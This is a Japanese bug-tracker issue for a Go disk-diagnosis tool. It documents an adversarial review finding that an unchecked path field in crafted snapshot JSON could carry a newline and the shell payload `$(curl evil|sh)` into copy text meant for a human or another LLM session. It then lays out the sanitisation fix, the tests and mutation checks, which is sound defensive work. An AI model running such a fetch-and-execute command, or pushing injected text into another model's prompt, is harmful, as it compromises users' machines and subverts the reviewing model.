# 193 bug: snapshot 復元で `Items[].Path` が無検査で y/Y のコピー文に載る / `doctor-disk.json` が無検査

起票日: 2026-09-03
重要度: **P1** (Items[].Path) / P2 (doctor-disk.json)
関連: [issues/done/178](done/178-bug-doctor-snapshot-trust-boundary.md) (信頼境界の本体。この issue はその**取りこぼし**) /
[issues/148](148-feat-glogx-doctor-disk-diagnosis.md) の ④ 不変条件

## 出典

178 の最終 commit (`37d6a579`) に対する敵対的レビュー (sonnet / read-only、2026-09-03 07:20 頃)。
178 本文の「採用 8 件 / 受容 1 件」のどちらにも入っていない**新規の指摘**。レビュワーは細工した
snapshot JSON を実際に書いて `go test` で再現している (実験ファイルは削除済み)。

## P1: `Items[].Path` が無検査

`sanitizeSnapshotResults` (`src/glogx/doctor_cache.go`) は Result の Status / Size / MeasuredAt と、
自由文の Reason / Failures / Contents は絞るが、**`disk.Item.Path` には触れていない** (Items を見るのは
負サイズの検査だけ。HEAD `37d6a579` で確認)。

再現: 細工した snapshot の `Items[0].Path` に埋め込み改行 + `$(curl evil|sh)` を置くと、
**`y` / `Y` のコピー文にそのまま出た** (レビュワーが実証)。178 が塞いだ Reason / Contents と
同じ経路 (`diskCopyText` は「別セッションの LLM に消してよいか聞く」形を作る) なので、
prompt injection と、人がそのまま貼る事故の両方が残っている。

対応案: Item.Path も `validateTarget` 相当の形の検査 (絶対パス / `filepath.Clean` と一致 / 制御文字なし)
を通し、崩れた Item を落とす。Item が 1 つでも落ちた Result は合計から外すか FromSnapshot 印を頼りに
再スキャンへ倒す。**④ の不変条件どおり、削除対象にはならない**ことは変わらない (表示とコピーの健全性の話)。

## P2: `doctor-disk.json` (起動トースト用キャッシュ) が無検査

178 の commit message は `doctor-snapshot.json` **と** `doctor-disk.json` を並べて「一般ユーザー権限で
書き換えられる」と名指ししているが、`loadDoctorDiskCache` は JSON を読んで `ScannedAt` の非ゼロだけ
確かめて返す (カタログ照合・長さ上限・Status の検査なし。HEAD で確認)。

- トーストの本文は共通の `sanitizePlainLine` を通るので**制御文字は防がれる**
- しかし偽の `Total` / `Label` はそのまま表示され、`doctorCacheFromReport` の partial マージ
  (172/173 で入れたエントリ単位マージ) が**カタログ照合なしで前回エントリを持ち越す**ので、
  一度書き込まれた偽エントリは partial のたびに延命する (上限は doctorCarryTTL = 24h)

対応案: `loadDoctorDiskCache` で snapshot 側と同じ境界を通す (カタログに無い ID を落とす /
未知 Status を落とす / Label の長さと制御文字 / 負サイズ)。snapshot 側の `sanitizeSnapshotResults`
と二重実装にせず、共通の helper へ寄せる。

## 受け入れ条件

- [x] 細工した snapshot の `Items[].Path` が行・`y`・`Y` に出ないことをテストで固定する
- [x] 細工した `doctor-disk.json` のカタログ外 ID / 未知 Status がトーストに出ないことをテストで固定する
- [x] 変異検証: 各ガードを外すと細工値が現れることを確認する
- [x] 178 本文の「壊せなかった」節に**この 2 件は含まれていなかった**ことを 1 行追記する

## 対応 (2026-09-03)

着手前に 2 件とも再現した (P1: 埋め込み改行 + `$(curl evil|sh)` が `y` / `Y` の両方にそのまま出た。
P2: カタログに無い ID の Label が**改行ごと**トーストに出た)。

### 設計判断 3 つ (「拡張しやすい方」で選んだ。ユーザー判断 2026-09-03)

| 判断 | 選んだ方 | 理由 |
|---|---|---|
| 崩れた Item をどう落とすか | **Item 単位で落とし、合計を引き直す** | Result ごと落とすとパス 1 本の細工で大きなエントリが理由なく消える。検査を足すほど消える範囲が広がる。Item 単位なら影響が局所に留まる |
| 共通化の単位 | **値ごとの述語** (`knownDiskStatus` / `plausibleSize` / `safeDisplayPath`) | 中間の構造体へ寄せると 3 つ目のキャッシュが増えたとき変換だけが増える。述語なら新しい型はそのフィールドに対して呼ぶだけ |
| カタログ照合の場所 | **表示側** (`doctorStartupToast` の入口) | `loadDoctorDiskCache` は cachedir とファイル I/O だけに依存する関数。カタログ照合が要るのは「人に見せる」瞬間だけなので、読み込みに依存を増やさない |

### 実装

- 述語 3 つを新設し、snapshot 側 (`sanitizeSnapshotResults`) と キャッシュ側 (`sanitizeDiskCache`) の
  両方から呼ぶ。新しい検査を足すときは述語を 1 つ足して呼び出し側に配る形
- `safeDisplayPath`: 空でない / 1024 (PATH_MAX) 以下 / 絶対パス / `filepath.Clean` と一致 / 制御文字なし
- 落とした Item は `Failures` に「N 件は形が壊れていたため除外しました」と残す (黙って消さない)
- `sanitizeDiskCache`: カタログ外 ID・未知 Status・負サイズを落とし、**合計と診断できず件数を
  残ったエントリから引き直す** (細工した `Total` / `Failed` を信用しない)。Label は 1 行に畳む

### 既存テストの fixture を 5 箇所直した

カタログ照合を入れたことで、**架空の ID (`a` / `b` / `small` / `heavy` / `xcode`) を使っていた
fixture が全件落ちる**ようになった。実在のカタログ ID へ置き換えた。
併せて「`Total` / `Failed` を手で設定する」形も直した (導出値なので引き直される。
production の `doctorCacheFromReport` も同じくエントリから数えるので、
Entries と整合しない `Failed` は実経路では起こらない)。

### 変異検証 (使い捨て worktree、4 本とも red)

| 変異 | 最初に落ちた assert |
|---|---|
| `safeDisplayPath` の制御文字チェックを外す | 崩れた Item が残っている |
| Item を落としても合計を引き直さない | 合計を引き直していない (300 のまま) |
| `sanitizeDiskCache` のカタログ照合を外す | 偽エントリがトーストに出た |
| `sanitizeDiskCache` を呼ばない | 細工した `Total` (999GB) と負サイズがトーストに出た |

`make test` rc=0 (`exhaustive` linter が `disk.Status` の switch で `blocked` を要求したので、
既存の同型 switch と揃えて `string` で分岐した)。

## 着手の注意

2026-09-03 07:00〜 は予約セッション (`dotfiles-87`) が同じ checkout で doctor 系を触っていた。
着手前に `issues/next/` を見て claim が無いことを確かめる (`claim-issue-in-next-and-push.md`)。
